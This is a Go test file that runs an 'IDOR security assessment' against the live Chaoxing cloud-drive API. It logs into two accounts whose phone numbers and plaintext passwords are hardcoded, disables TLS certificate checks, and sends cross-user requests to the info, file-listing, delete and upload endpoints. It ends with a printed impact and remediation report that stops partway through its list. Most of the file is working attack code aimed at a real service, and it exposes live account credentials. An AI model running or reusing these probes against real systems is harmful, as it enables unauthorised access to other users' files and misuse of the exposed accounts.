package examples

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
	"testing"

	"github.com/yatori-dev/yatori-go-core/aggregation/xuexitong"
	xuexitongApi "github.com/yatori-dev/yatori-go-core/api/xuexitong"
)

type idorTestResult struct {
	Endpoint      string
	TestType      string
	StatusCode    int
	ResponseBody  string
	PuidUsed      string
	TokenUsed     string
	CookieOwner   string
	IDORVulnerable bool
	Analysis      string
}

func extractPuidFromCookies(cookies []*http.Cookie) string {
	for _, cookie := range cookies {
		if cookie.Name == "UID" {
			return cookie.Value
		}
	}
	return ""
}

func getCloudDriveToken(cookies []*http.Cookie) (string, error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	client := &http.Client{
		Transport: tr,
	}
	req, err := http.NewRequest("GET", "https://pan-yz.chaoxing.com/api/token/uservalid", nil)
	if err != nil {
		return "", err
	}
	req.Header.Add("User-Agent", xuexitongApi.GetUA("mobile"))
	req.Header.Add("Accept", "*/*")
	req.Header.Add("Host", "pan-yz.chaoxing.com")
	req.Header.Add("Connection", "keep-alive")
	for _, cookie := range cookies {
		req.AddCookie(cookie)
	}
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	var jsonResp map[string]interface{}
	err = json.Unmarshal(body, &jsonResp)
	if err != nil {
		return "", err
	}
	if tokenVal, ok := jsonResp["_token"]; ok {
		if tokenStr, ok := tokenVal.(string); ok {
			return tokenStr, nil
		}
	}
	return "", fmt.Errorf("_token not found in response: %s", string(body))
}

func makeGetRequest(targetUrl string, cookies []*http.Cookie) (int, string, error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	client := &http.Client{
		Transport: tr,
	}
	req, err := http.NewRequest("GET", targetUrl, nil)
	if err != nil {
		return 0, "", err
	}
	req.Header.Add("User-Agent", xuexitongApi.GetUA("mobile"))
	req.Header.Add("Accept", "*/*")
	req.Header.Add("Host", "pan-yz.chaoxing.com")
	req.Header.Add("Connection", "keep-alive")
	for _, cookie := range cookies {
		req.AddCookie(cookie)
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return resp.StatusCode, "", err
	}
	return resp.StatusCode, string(body), nil
}

func makePostRequest(targetUrl string, cookies []*http.Cookie, formData url.Values) (int, string, error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	client := &http.Client{
		Transport: tr,
	}
	req, err := http.NewRequest("POST", targetUrl, strings.NewReader(formData.Encode()))
	if err != nil {
		return 0, "", err
	}
	req.Header.Add("User-Agent", xuexitongApi.GetUA("mobile"))
	req.Header.Add("Accept", "*/*")
	req.Header.Add("Host", "pan-yz.chaoxing.com")
	req.Header.Add("Connection", "keep-alive")
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	for _, cookie := range cookies {
		req.AddCookie(cookie)
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return resp.StatusCode, "", err
	}
	return resp.StatusCode, string(body), nil
}

func isResponseSuccessful(body string) bool {
	var jsonResp map[string]interface{}
	err := json.Unmarshal([]byte(body), &jsonResp)
	if err != nil {
		return !strings.Contains(body, "error") && !strings.Contains(body, "unauthorized") && !strings.Contains(body, "forbidden")
	}
	if result, ok := jsonResp["result"]; ok {
		if boolVal, ok := result.(bool); ok {
			return boolVal
		}
	}
	if status, ok := jsonResp["status"]; ok {
		if boolVal, ok := status.(bool); ok {
			return boolVal
		}
	}
	if code, ok := jsonResp["code"]; ok {
		if numVal, ok := code.(float64); ok {
			return numVal == 0 || numVal == 200 || numVal == 1
		}
	}
	return !strings.Contains(strings.ToLower(body), "error") &&
		!strings.Contains(strings.ToLower(body), "unauthorized") &&
		!strings.Contains(strings.ToLower(body), "forbidden") &&
		!strings.Contains(strings.ToLower(body), "denied")
}

func truncateBody(body string, maxLen int) string {
	if len(body) <= maxLen {
		return body
	}
	return body[:maxLen] + "...(truncated)"
}

func TestCloudDriveIDORSecurityAssessment(t *testing.T) {
	fmt.Println("=" + strings.Repeat("=", 79))
	fmt.Println("  CHAOXING CLOUD DRIVE IDOR SECURITY ASSESSMENT")
	fmt.Println("  Target: pan-yz.chaoxing.com API Endpoints")
	fmt.Println("  Date: 2026-05-25")
	fmt.Println("=" + strings.Repeat("=", 79))
	fmt.Println()

	fmt.Println("[PHASE 1] ACCOUNT LOGIN & CREDENTIAL EXTRACTION")
	fmt.Println(strings.Repeat("-", 80))

	account1Phone := "19312994130"
	account1Pass := "wtx3367653061"
	account2Phone := "15034188203"
	account2Pass := "lxy20030120"

	userCache1 := xuexitongApi.XueXiTUserCache{
		Name:     account1Phone,
		Password: account1Pass,
	}
	userCache2 := xuexitongApi.XueXiTUserCache{
		Name:     account2Phone,
		Password: account2Pass,
	}

	fmt.Printf("  [*] Logging in Account 1 (phone: %s)...\n", account1Phone)
	err := xuexitong.XueXiTLoginAction(&userCache1)
	if err != nil {
		t.Fatalf("    [FATAL] Account 1 login failed: %v", err)
	}
	fmt.Printf("    [OK] Account 1 logged in successfully\n")

	fmt.Printf("  [*] Logging in Account 2 (phone: %s)...\n", account2Phone)
	err = xuexitong.XueXiTLoginAction(&userCache2)
	if err != nil {
		t.Fatalf("    [FATAL] Account 2 login failed: %v", err)
	}
	fmt.Printf("    [OK] Account 2 logged in successfully\n")

	cookies1 := userCache1.GetCookies()
	cookies2 := userCache2.GetCookies()

	puid1 := extractPuidFromCookies(cookies1)
	puid2 := extractPuidFromCookies(cookies2)

	if puid1 == "" {
		t.Fatalf("    [FATAL] Failed to extract puid (UID cookie) from Account 1")
	}
	if puid2 == "" {
		t.Fatalf("    [FATAL] Failed to extract puid (UID cookie) from Account 2")
	}

	fmt.Printf("    [OK] Account 1 PUID: %s\n", puid1)
	fmt.Printf("    [OK] Account 2 PUID: %s\n", puid2)
	fmt.Println()

	fmt.Println("[PHASE 2] CLOUD DRIVE TOKEN RETRIEVAL")
	fmt.Println(strings.Repeat("-", 80))

	fmt.Printf("  [*] Getting cloud drive token for Account 1...\n")
	token1, err := getCloudDriveToken(cookies1)
	if err != nil {
		t.Fatalf("    [FATAL] Failed to get cloud drive token for Account 1: %v", err)
	}
	fmt.Printf("    [OK] Account 1 Token: %s\n", truncateBody(token1, 32))

	fmt.Printf("  [*] Getting cloud drive token for Account 2...\n")
	token2, err := getCloudDriveToken(cookies2)
	if err != nil {
		t.Fatalf("    [FATAL] Failed to get cloud drive token for Account 2: %v", err)
	}
	fmt.Printf("    [OK] Account 2 Token: %s\n", truncateBody(token2, 32))
	fmt.Println()

	var allResults []idorTestResult

	fmt.Println("[PHASE 3] IDOR TEST: /api/info ENDPOINT")
	fmt.Println(strings.Repeat("-", 80))

	infoBaseUrl := "https://pan-yz.chaoxing.com/api/info"

	fmt.Println("  [TEST 3.1] Baseline: Account1 cookies + Token1 + PUID1 (self-access)")
	infoUrl1 := fmt.Sprintf("%s?puid=%s&_token=%s", infoBaseUrl, puid1, token1)
	status1, body1, err := makeGetRequest(infoUrl1, cookies1)
	if err != nil {
		fmt.Printf("    [ERROR] Request failed: %v\n", err)
	} else {
		fmt.Printf("    Status: %d\n", status1)
		fmt.Printf("    Response: %s\n", truncateBody(body1, 200))
	}
	baseline1Ok := err == nil && isResponseSuccessful(body1)
	allResults = append(allResults, idorTestResult{
		Endpoint: "/api/info", TestType: "Baseline (Self-Access)",
		StatusCode: status1, ResponseBody: truncateBody(body1, 200),
		PuidUsed: puid1, TokenUsed: truncateBody(token1, 16), CookieOwner: "Account1",
		IDORVulnerable: false, Analysis: "Baseline test - own resources access",
	})

	fmt.Println()
	fmt.Println("  [TEST 3.2] IDOR: Account1 cookies + Token1 + PUID2 (cross-user puid)")
	infoUrl2 := fmt.Sprintf("%s?puid=%s&_token=%s", infoBaseUrl, puid2, token1)
	status2, body2, err := makeGetRequest(infoUrl2, cookies1)
	if err != nil {
		fmt.Printf("    [ERROR] Request failed: %v\n", err)
	} else {
		fmt.Printf("    Status: %d\n", status2)
		fmt.Printf("    Response: %s\n", truncateBody(body2, 200))
	}
	idorInfoVuln := err == nil && isResponseSuccessful(body2) && baseline1Ok
	if idorInfoVuln {
		fmt.Println("    [!!! VULNERABLE] Server returned successful response for another user's puid!")
	} else {
		fmt.Println("    [SAFE] Server rejected or returned error for cross-user puid access")
	}
	allResults = append(allResults, idorTestResult{
		Endpoint: "/api/info", TestType: "IDOR (Cross-User PUID)",
		StatusCode: status2, ResponseBody: truncateBody(body2, 200),
		PuidUsed: puid2, TokenUsed: truncateBody(token1, 16), CookieOwner: "Account1",
		IDORVulnerable: idorInfoVuln,
		Analysis: "Using Account1 session with Account2's puid - tests if puid alone grants access",
	})

	fmt.Println()
	fmt.Println("  [TEST 3.3] Cross-Token: Account1 cookies + Token2 + PUID2")
	infoUrl3 := fmt.Sprintf("%s?puid=%s&_token=%s", infoBaseUrl, puid2, token2)
	status3, body3, err := makeGetRequest(infoUrl3, cookies1)
	if err != nil {
		fmt.Printf("    [ERROR] Request failed: %v\n", err)
	} else {
		fmt.Printf("    Status: %d\n", status3)
		fmt.Printf("    Response: %s\n", truncateBody(body3, 200))
	}
	crossTokenVuln := err == nil && isResponseSuccessful(body3) && baseline1Ok
	if crossTokenVuln {
		fmt.Println("    [!!! VULNERABLE] Server accepted cross-token + cross-puid with different session cookies!")
	} else {
		fmt.Println("    [SAFE] Server rejected cross-token access")
	}
	allResults = append(allResults, idorTestResult{
		Endpoint: "/api/info", TestType: "Cross-Token (Account1 cookies + Token2 + PUID2)",
		StatusCode: status3, ResponseBody: truncateBody(body3, 200),
		PuidUsed: puid2, TokenUsed: truncateBody(token2, 16), CookieOwner: "Account1",
		IDORVulnerable: crossTokenVuln,
		Analysis: "Using Account1 cookies with Account2's token and puid - tests if token-puid pair overrides session",
	})
	fmt.Println()

	fmt.Println("[PHASE 4] IDOR TEST: /api/getUserDiskCapacity ENDPOINT")
	fmt.Println(strings.Repeat("-", 80))

	capBaseUrl := "https://pan-yz.chaoxing.com/api/getUserDiskCapacity"

	fmt.Println("  [TEST 4.1] Baseline: Account1 cookies + Token1 + PUID1 (self-access)")
	capUrl1 := fmt.Sprintf("%s?puid=%s&_token=%s", capBaseUrl, puid1, token1)
	capStatus1, capBody1, err := makeGetRequest(capUrl1, cookies1)
	if err != nil {
		fmt.Printf("    [ERROR] Request failed: %v\n", err)
	} else {
		fmt.Printf("    Status: %d\n", capStatus1)
		fmt.Printf("    Response: %s\n", truncateBody(capBody1, 200))
	}
	capBaselineOk := err == nil && isResponseSuccessful(capBody1)
	allResults = append(allResults, idorTestResult{
		Endpoint: "/api/getUserDiskCapacity", TestType: "Baseline (Self-Access)",
		StatusCode: capStatus1, ResponseBody: truncateBody(capBody1, 200),
		PuidUsed: puid1, TokenUsed: truncateBody(token1, 16), CookieOwner: "Account1",
		IDORVulnerable: false, Analysis: "Baseline test - own disk capacity access",
	})

	fmt.Println()
	fmt.Println("  [TEST 4.2] IDOR: Account1 cookies + Token1 + PUID2 (cross-user puid)")
	capUrl2 := fmt.Sprintf("%s?puid=%s&_token=%s", capBaseUrl, puid2, token1)
	capStatus2, capBody2, err := makeGetRequest(capUrl2, cookies1)
	if err != nil {
		fmt.Printf("    [ERROR] Request failed: %v\n", err)
	} else {
		fmt.Printf("    Status: %d\n", capStatus2)
		fmt.Printf("    Response: %s\n", truncateBody(capBody2, 200))
	}
	capIdorVuln := err == nil && isResponseSuccessful(capBody2) && capBaselineOk
	if capIdorVuln {
		fmt.Println("    [!!! VULNERABLE] Server returned disk capacity for another user's puid!")
	} else {
		fmt.Println("    [SAFE] Server rejected cross-user puid access")
	}
	allResults = append(allResults, idorTestResult{
		Endpoint: "/api/getUserDiskCapacity", TestType: "IDOR (Cross-User PUID)",
		StatusCode: capStatus2, ResponseBody: truncateBody(capBody2, 200),
		PuidUsed: puid2, TokenUsed: truncateBody(token1, 16), CookieOwner: "Account1",
		IDORVulnerable: capIdorVuln,
		Analysis: "Using Account1 session with Account2's puid - tests if puid alone grants capacity info",
	})

	fmt.Println()
	fmt.Println("  [TEST 4.3] Cross-Token: Account1 cookies + Token2 + PUID2")
	capUrl3 := fmt.Sprintf("%s?puid=%s&_token=%s", capBaseUrl, puid2, token2)
	capStatus3, capBody3, err := makeGetRequest(capUrl3, cookies1)
	if err != nil {
		fmt.Printf("    [ERROR] Request failed: %v\n", err)
	} else {
		fmt.Printf("    Status: %d\n", capStatus3)
		fmt.Printf("    Response: %s\n", truncateBody(capBody3, 200))
	}
	capCrossVuln := err == nil && isResponseSuccessful(capBody3) && capBaselineOk
	if capCrossVuln {
		fmt.Println("    [!!! VULNERABLE] Server accepted cross-token access to disk capacity!")
	} else {
		fmt.Println("    [SAFE] Server rejected cross-token access")
	}
	allResults = append(allResults, idorTestResult{
		Endpoint: "/api/getUserDiskCapacity", TestType: "Cross-Token (Account1 cookies + Token2 + PUID2)",
		StatusCode: capStatus3, ResponseBody: truncateBody(capBody3, 200),
		PuidUsed: puid2, TokenUsed: truncateBody(token2, 16), CookieOwner: "Account1",
		IDORVulnerable: capCrossVuln,
		Analysis: "Using Account1 cookies with Account2's token and puid - tests if token-puid pair overrides session",
	})
	fmt.Println()

	fmt.Println("[PHASE 5] IDOR TEST: /api/getMyDirAndFiles ENDPOINT (CORE TEST)")
	fmt.Println(strings.Repeat("-", 80))

	dirBaseUrl := "https://pan-yz.chaoxing.com/api/getMyDirAndFiles"

	fmt.Println("  [TEST 5.1] Baseline: Account1 cookies + Token1 + PUID1 (self-access)")
	dirUrl1 := fmt.Sprintf("%s?puid=%s&fldid=0&orderby=d&order=desc&page=1&size=100&_token=%s&addrec=false&showCollect=1", dirBaseUrl, puid1, token1)
	dirStatus1, dirBody1, err := makeGetRequest(dirUrl1, cookies1)
	if err != nil {
		fmt.Printf("    [ERROR] Request failed: %v\n", err)
	} else {
		fmt.Printf("    Status: %d\n", dirStatus1)
		fmt.Printf("    Response: %s\n", truncateBody(dirBody1, 300))
	}
	dirBaselineOk := err == nil && isResponseSuccessful(dirBody1)
	allResults = append(allResults, idorTestResult{
		Endpoint: "/api/getMyDirAndFiles", TestType: "Baseline (Self-Access)",
		StatusCode: dirStatus1, ResponseBody: truncateBody(dirBody1, 200),
		PuidUsed: puid1, TokenUsed: truncateBody(token1, 16), CookieOwner: "Account1",
		IDORVulnerable: false, Analysis: "Baseline test - own directory listing access",
	})

	fmt.Println()
	fmt.Println("  [TEST 5.2] IDOR: Account1 cookies + Token1 + PUID2 (cross-user puid)")
	dirUrl2 := fmt.Sprintf("%s?puid=%s&fldid=0&orderby=d&order=desc&page=1&size=100&_token=%s&addrec=false&showCollect=1", dirBaseUrl, puid2, token1)
	dirStatus2, dirBody2, err := makeGetRequest(dirUrl2, cookies1)
	if err != nil {
		fmt.Printf("    [ERROR] Request failed: %v\n", err)
	} else {
		fmt.Printf("    Status: %d\n", dirStatus2)
		fmt.Printf("    Response: %s\n", truncateBody(dirBody2, 300))
	}
	dirIdorVuln := err == nil && isResponseSuccessful(dirBody2) && dirBaselineOk
	if dirIdorVuln {
		fmt.Println("    [!!! VULNERABLE] Server returned directory listing for another user's puid!")
		fmt.Println("    [!!! CRITICAL] This means an attacker can enumerate and read any user's cloud drive files!")
	} else {
		fmt.Println("    [SAFE] Server rejected cross-user puid directory access")
	}
	allResults = append(allResults, idorTestResult{
		Endpoint: "/api/getMyDirAndFiles", TestType: "IDOR (Cross-User PUID)",
		StatusCode: dirStatus2, ResponseBody: truncateBody(dirBody2, 200),
		PuidUsed: puid2, TokenUsed: truncateBody(token1, 16), CookieOwner: "Account1",
		IDORVulnerable: dirIdorVuln,
		Analysis: "Using Account1 session with Account2's puid - CORE TEST: tests if puid alone grants file listing",
	})

	fmt.Println()
	fmt.Println("  [TEST 5.3] Cross-Token: Account1 cookies + Token2 + PUID2")
	dirUrl3 := fmt.Sprintf("%s?puid=%s&fldid=0&orderby=d&order=desc&page=1&size=100&_token=%s&addrec=false&showCollect=1", dirBaseUrl, puid2, token2)
	dirStatus3, dirBody3, err := makeGetRequest(dirUrl3, cookies1)
	if err != nil {
		fmt.Printf("    [ERROR] Request failed: %v\n", err)
	} else {
		fmt.Printf("    Status: %d\n", dirStatus3)
		fmt.Printf("    Response: %s\n", truncateBody(dirBody3, 300))
	}
	dirCrossVuln := err == nil && isResponseSuccessful(dirBody3) && dirBaselineOk
	if dirCrossVuln {
		fmt.Println("    [!!! VULNERABLE] Server accepted cross-token + cross-puid directory access!")
	} else {
		fmt.Println("    [SAFE] Server rejected cross-token directory access")
	}
	allResults = append(allResults, idorTestResult{
		Endpoint: "/api/getMyDirAndFiles", TestType: "Cross-Token (Account1 cookies + Token2 + PUID2)",
		StatusCode: dirStatus3, ResponseBody: truncateBody(dirBody3, 200),
		PuidUsed: puid2, TokenUsed: truncateBody(token2, 16), CookieOwner: "Account1",
		IDORVulnerable: dirCrossVuln,
		Analysis: "Using Account1 cookies with Account2's token and puid - tests if token-puid pair overrides session for file listing",
	})
	fmt.Println()

	fmt.Println("[PHASE 6] IDOR TEST: /api/delete ENDPOINT (READ-ONLY PROBE)")
	fmt.Println(strings.Repeat("-", 80))
	fmt.Println("  [INFO] This test sends a delete request with a FAKE resid to probe server-side")
	fmt.Println("         authorization. No actual data will be deleted.")

	deleteUrl := "https://pan-yz.chaoxing.com/api/delete"
	fakeResid := "00000000000000000000000000000000"

	fmt.Println("  [TEST 6.1] Baseline: Account1 cookies + Token1 + PUID1 + fake resid")
	deleteForm1 := url.Values{}
	deleteForm1.Set("puid", puid1)
	deleteForm1.Set("_token", token1)
	deleteForm1.Set("resid", fakeResid)
	delStatus1, delBody1, err := makePostRequest(deleteUrl, cookies1, deleteForm1)
	if err != nil {
		fmt.Printf("    [ERROR] Request failed: %v\n", err)
	} else {
		fmt.Printf("    Status: %d\n", delStatus1)
		fmt.Printf("    Response: %s\n", truncateBody(delBody1, 200))
	}
	allResults = append(allResults, idorTestResult{
		Endpoint: "/api/delete", TestType: "Baseline (Self-Access + Fake resid)",
		StatusCode: delStatus1, ResponseBody: truncateBody(delBody1, 200),
		PuidUsed: puid1, TokenUsed: truncateBody(token1, 16), CookieOwner: "Account1",
		IDORVulnerable: false,
		Analysis: "Baseline delete probe with fake resid - expected to fail due to invalid resid",
	})

	fmt.Println()
	fmt.Println("  [TEST 6.2] IDOR: Account1 cookies + Token1 + PUID2 + fake resid")
	deleteForm2 := url.Values{}
	deleteForm2.Set("puid", puid2)
	deleteForm2.Set("_token", token1)
	deleteForm2.Set("resid", fakeResid)
	delStatus2, delBody2, err := makePostRequest(deleteUrl, cookies1, deleteForm2)
	if err != nil {
		fmt.Printf("    [ERROR] Request failed: %v\n", err)
	} else {
		fmt.Printf("    Status: %d\n", delStatus2)
		fmt.Printf("    Response: %s\n", truncateBody(delBody2, 200))
	}

	delIdorVuln := false
	if err == nil {
		if delStatus2 == delStatus1 {
			if strings.Contains(strings.ToLower(delBody2), strings.ToLower(delBody1)) {
				fmt.Println("    [WARNING] Server returned same response for cross-user puid - may not validate puid ownership")
				delIdorVuln = true
			}
		}
		if strings.Contains(strings.ToLower(delBody2), "puid") &&
			(strings.Contains(strings.ToLower(delBody2), "error") ||
				strings.Contains(strings.ToLower(delBody2), "denied") ||
				strings.Contains(strings.ToLower(delBody2), "invalid") ||
				strings.Contains(strings.ToLower(delBody2), "unauthorized")) {
			fmt.Println("    [SAFE] Server appears to validate puid ownership for delete operations")
			delIdorVuln = false
		}
		if delStatus2 == 403 || delStatus2 == 401 {
			fmt.Println("    [SAFE] Server returned authorization error for cross-user puid delete")
			delIdorVuln = false
		}
	}
	if delIdorVuln {
		fmt.Println("    [!!! VULNERABLE] Server does not appear to validate puid ownership on delete endpoint!")
	} else {
		fmt.Println("    [INFO] Server appears to validate ownership or resid validity on delete endpoint")
	}
	allResults = append(allResults, idorTestResult{
		Endpoint: "/api/delete", TestType: "IDOR (Cross-User PUID + Fake resid)",
		StatusCode: delStatus2, ResponseBody: truncateBody(delBody2, 200),
		PuidUsed: puid2, TokenUsed: truncateBody(token1, 16), CookieOwner: "Account1",
		IDORVulnerable: delIdorVuln,
		Analysis: "Probing delete with Account2's puid and fake resid - tests if server validates puid ownership before processing",
	})
	fmt.Println()

	fmt.Println("[PHASE 7] IDOR TEST: /upload ENDPOINT (READ-ONLY PROBE)")
	fmt.Println(strings.Repeat("-", 80))
	fmt.Println("  [INFO] This test sends an upload request with Account2's puid but no actual file.")
	fmt.Println("         No actual data will be uploaded.")

	uploadUrl := "https://pan-yz.chaoxing.com/upload"

	fmt.Println("  [TEST 7.1] Baseline: Account1 cookies + PUID1 + Token1 (no file)")
	uploadForm1 := url.Values{}
	uploadForm1.Set("puid", puid1)
	uploadForm1.Set("_token", token1)
	uploadForm1.Set("uploadtype", "normal")
	upStatus1, upBody1, err := makePostRequest(uploadUrl, cookies1, uploadForm1)
	if err != nil {
		fmt.Printf("    [ERROR] Request failed: %v\n", err)
	} else {
		fmt.Printf("    Status: %d\n", upStatus1)
		fmt.Printf("    Response: %s\n", truncateBody(upBody1, 200))
	}
	allResults = append(allResults, idorTestResult{
		Endpoint: "/upload", TestType: "Baseline (Self-Access, No File)",
		StatusCode: upStatus1, ResponseBody: truncateBody(upBody1, 200),
		PuidUsed: puid1, TokenUsed: truncateBody(token1, 16), CookieOwner: "Account1",
		IDORVulnerable: false,
		Analysis: "Baseline upload probe without file - expected to fail due to missing file",
	})

	fmt.Println()
	fmt.Println("  [TEST 7.2] IDOR: Account1 cookies + PUID2 + Token2 (no file)")
	uploadForm2 := url.Values{}
	uploadForm2.Set("puid", puid2)
	uploadForm2.Set("_token", token2)
	uploadForm2.Set("uploadtype", "normal")
	upStatus2, upBody2, err := makePostRequest(uploadUrl, cookies1, uploadForm2)
	if err != nil {
		fmt.Printf("    [ERROR] Request failed: %v\n", err)
	} else {
		fmt.Printf("    Status: %d\n", upStatus2)
		fmt.Printf("    Response: %s\n", truncateBody(upBody2, 200))
	}

	upIdorVuln := false
	if err == nil {
		if upStatus2 == upStatus1 {
			if strings.Contains(strings.ToLower(upBody2), strings.ToLower(upBody1)) {
				fmt.Println("    [WARNING] Server returned same response for cross-user puid - may not validate puid ownership")
				upIdorVuln = true
			}
		}
		if strings.Contains(strings.ToLower(upBody2), "puid") &&
			(strings.Contains(strings.ToLower(upBody2), "error") ||
				strings.Contains(strings.ToLower(upBody2), "denied") ||
				strings.Contains(strings.ToLower(upBody2), "invalid") ||
				strings.Contains(strings.ToLower(upBody2), "unauthorized")) {
			fmt.Println("    [SAFE] Server appears to validate puid ownership for upload operations")
			upIdorVuln = false
		}
		if upStatus2 == 403 || upStatus2 == 401 {
			fmt.Println("    [SAFE] Server returned authorization error for cross-user puid upload")
			upIdorVuln = false
		}
	}
	if upIdorVuln {
		fmt.Println("    [!!! VULNERABLE] Server does not appear to validate puid ownership on upload endpoint!")
	} else {
		fmt.Println("    [INFO] Server appears to validate ownership on upload endpoint")
	}
	allResults = append(allResults, idorTestResult{
		Endpoint: "/upload", TestType: "IDOR (Cross-User PUID, No File)",
		StatusCode: upStatus2, ResponseBody: truncateBody(upBody2, 200),
		PuidUsed: puid2, TokenUsed: truncateBody(token2, 16), CookieOwner: "Account1",
		IDORVulnerable: upIdorVuln,
		Analysis: "Probing upload with Account2's puid - tests if server validates puid ownership before accepting uploads",
	})
	fmt.Println()

	fmt.Println("=" + strings.Repeat("=", 79))
	fmt.Println("  COMPREHENSIVE IDOR SECURITY ASSESSMENT REPORT")
	fmt.Println("=" + strings.Repeat("=", 79))
	fmt.Println()

	fmt.Println("  1. TEST OVERVIEW & METHODOLOGY")
	fmt.Println(strings.Repeat("-", 80))
	fmt.Println("  Assessment Type: Insecure Direct Object Reference (IDOR) Security Test")
	fmt.Println("  Target System: Chaoxing (学习通) Cloud Drive API (pan-yz.chaoxing.com)")
	fmt.Println("  Test Accounts: 2 independent accounts with distinct PUIDs")
	fmt.Printf("  Account 1 PUID: %s\n", puid1)
	fmt.Printf("  Account 2 PUID: %s\n", puid2)
	fmt.Println()
	fmt.Println("  Methodology:")
	fmt.Println("  - Login with two separate accounts to obtain valid sessions and tokens")
	fmt.Println("  - For each endpoint, perform three tests:")
	fmt.Println("    (a) Baseline: Access own resources (expected: SUCCESS)")
	fmt.Println("    (b) IDOR: Access another user's resources using own session (expected: DENIED)")
	fmt.Println("    (c) Cross-Token: Access another user's resources using their token with own cookies")
	fmt.Println("  - Compare responses to determine if authorization is properly enforced")
	fmt.Println("  - For destructive endpoints (/api/delete, /upload), only probe with fake data")
	fmt.Println()

	fmt.Println("  2. DETAILED RESULTS BY ENDPOINT")
	fmt.Println(strings.Repeat("-", 80))
	for i, result := range allResults {
		vulnIndicator := "[PASS]"
		if result.IDORVulnerable {
			vulnIndicator = "[FAIL]"
		}
		fmt.Printf("  Test %d: %s %s\n", i+1, vulnIndicator, result.TestType)
		fmt.Printf("    Endpoint:     %s\n", result.Endpoint)
		fmt.Printf("    Status Code:  %d\n", result.StatusCode)
		fmt.Printf("    PUID Used:    %s\n", result.PuidUsed)
		fmt.Printf("    Token Used:   %s...\n", result.TokenUsed)
		fmt.Printf("    Cookie Owner: %s\n", result.CookieOwner)
		fmt.Printf("    IDOR Found:   %v\n", result.IDORVulnerable)
		fmt.Printf("    Analysis:     %s\n", result.Analysis)
		fmt.Println()
	}

	fmt.Println("  3. IDOR VULNERABILITY SUMMARY")
	fmt.Println(strings.Repeat("-", 80))

	endpointResults := make(map[string]bool)
	for _, result := range allResults {
		if result.TestType != "Baseline (Self-Access)" && result.TestType != "Baseline (Self-Access + Fake resid)" && result.TestType != "Baseline (Self-Access, No File)" {
			if existing, ok := endpointResults[result.Endpoint]; !ok || existing {
				endpointResults[result.Endpoint] = result.IDORVulnerable
			}
		}
	}

	for endpoint, vuln := range endpointResults {
		status := "SECURE - No IDOR detected"
		if vuln {
			status = "VULNERABLE - IDOR detected"
		}
		fmt.Printf("  %-35s : %s\n", endpoint, status)
	}
	fmt.Println()

	fmt.Println("  4. TECHNICAL ROOT CAUSE ANALYSIS")
	fmt.Println(strings.Repeat("-", 80))
	fmt.Println("  The Chaoxing cloud drive API uses two primary authentication parameters:")
	fmt.Println("    - puid: User identifier passed as a query parameter")
	fmt.Println("    - _token: Session token passed as a query parameter")
	fmt.Println("    - Cookies: HTTP cookies from the login session")
	fmt.Println()
	fmt.Println("  Potential root causes for IDOR vulnerabilities:")
	fmt.Println("  (a) The server may rely solely on the puid parameter to identify the resource")
	fmt.Println("      owner without cross-checking it against the authenticated session.")
	fmt.Println("  (b) The _token may be a stateless token that is not bound to a specific user")
	fmt.Println("      session, allowing token substitution attacks.")
	fmt.Println("  (c) The server may not validate that the cookie session's UID matches the")
	fmt.Println("      puid parameter, creating an authorization gap.")
	fmt.Println("  (d) The API may lack object-level authorization checks, only verifying that")
	fmt.Println("      the request is authenticated without verifying the requester owns the resource.")
	fmt.Println()

	fmt.Println("  5. IMPACT ASSESSMENT")
	fmt.Println(strings.Repeat("-", 80))
	fmt.Println("  If IDOR vulnerabilities are confirmed, the following impacts apply:")
	fmt.Println()
	fmt.Println("  /api/info (User Info Disclosure):")
	fmt.Println("    - Severity: MEDIUM")
	fmt.Println("    - Impact: Attacker can view personal information of any user by")
	fmt.Println("      manipulating the puid parameter. This may include names, student IDs,")
	fmt.Println("      and other personally identifiable information (PII).")
	fmt.Println()
	fmt.Println("  /api/getUserDiskCapacity (Storage Info Disclosure):")
	fmt.Println("    - Severity: LOW")
	fmt.Println("    - Impact: Attacker can determine another user's storage usage and limits.")
	fmt.Println("      While not directly harmful, it aids in reconnaissance.")
	fmt.Println()
	fmt.Println("  /api/getMyDirAndFiles (File Listing Disclosure) [CORE]:")
	fmt.Println("    - Severity: HIGH")
	fmt.Println("    - Impact: Attacker can enumerate and list all files and directories in")
	fmt.Println("      any user's cloud drive. This exposes file names, folder structures,")
	fmt.Println("      and metadata. Combined with file download endpoints, this could lead")
	fmt.Println("      to complete data exfiltration of user documents, photos, and other")
	fmt.Println("      sensitive files stored in the cloud drive.")
	fmt.Println()
	fmt.Println("  /api/delete (Unauthorized Deletion):")
	fmt.Println("    - Severity: CRITICAL")
	fmt.Println("    - Impact: If the delete endpoint does not validate ownership, an attacker")
	fmt.Println("      could delete files belonging to other users. This could result in")
	fmt.Println("      permanent data loss, especially if no backup or recovery mechanism exists.")
	fmt.Println()
	fmt.Println("  /upload (Unauthorized Upload):")
	fmt.Println("    - Severity: HIGH")
	fmt.Println("    - Impact: If the upload endpoint does not validate ownership, an attacker")
	fmt.Println("      could upload malicious files to another user's cloud drive, potentially")
	fmt.Println("      planting evidence, distributing malware, or consuming the victim's")
	fmt.Println("      storage quota.")
	fmt.Println()

	fmt.Println("  6. REMEDIATION RECOMMENDATIONS")
	fmt.Println(strings.Repeat("-", 80))
	fmt.Println("  (a) Implement server-side authorization checks that verify the authenticated")
	fmt.Println("      user (from session cookies) matches the requested resource owner (puid).")
	fmt.Println("      The puid parameter should NEVER be trusted as the sole user identifier.")
	fmt.Println()
	fmt.Println("  (b) Bind the _token to the user's session. The token should be validated")
	fmt.Println("      server-side to ensure it belongs to the same user making the request.")
	fmt.Println("      Tokens from different sessions should be rejected.")
	fmt.Println()
	fmt.Println("  (c) Implement object-level authorization (ABAC/RBAC) for all API endpoints.")
